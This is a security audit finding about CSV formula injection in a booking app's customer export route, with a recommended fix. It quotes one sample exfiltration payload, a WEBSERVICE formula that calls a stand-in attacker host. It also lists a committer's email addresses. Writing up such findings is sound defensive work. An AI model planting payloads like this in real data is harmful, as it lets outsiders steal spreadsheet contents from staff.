# [MEDIUM] Guest-controlled CSV fields can execute spreadsheet formulas

**File:** [`src/app/api/ops/customers/export/route.ts`](https://github.com/lapeninns/nabatable/blob/codex/Menu/blob/codex/src/app/api/ops/customers/export/route.ts#L38-L136) (lines 38, 39, 40, 136)
**Project:** nabatableLP
**Severity:** MEDIUM • **Confidence:** high • **Slug:** `other-csv-injection`

## Owners

**Suggested assignee:** `159779640+amanshresthaa@users.noreply.github.com` _(via last-committer)_

## Finding

The export includes guest-controlled customer fields such as name, email, and phone in CUSTOMER_EXPORT_COLUMNS, then passes them directly to generateCSV. The shared CSV helper only quotes delimiter characters and does not neutralize leading formula characters such as =, +, -, @, tab, or carriage return. A guest can create a booking/customer profile with a value like =WEBSERVICE("https://attacker.example/?x="&A1); when staff export guests and open the CSV in Excel or similar spreadsheet software, the formula can execute and exfiltrate local sheet data or trigger external requests. The route is authenticated and tenant-scoped, but the attacker-controlled data enters through the public booking/customer flow and is later rendered into an operator-downloaded CSV.

## Recommendation

Escape formula-like CSV cells before writing them, preferably in lib/export/csv.ts so all exports are covered. Prefix cells whose trimmed value starts with =, +, -, @, tab, or CR/LF with a single quote or another spreadsheet-safe neutralizer, and add regression tests for exported guest fields.

## Recent committers (`git log`)

- amanshresthaa <159779640+amanshresthaa@users.noreply.github.com> (2026-05-05)
- amanshresthaa <aman.shrestha@mail.bcu.ac.uk> (2026-02-06)
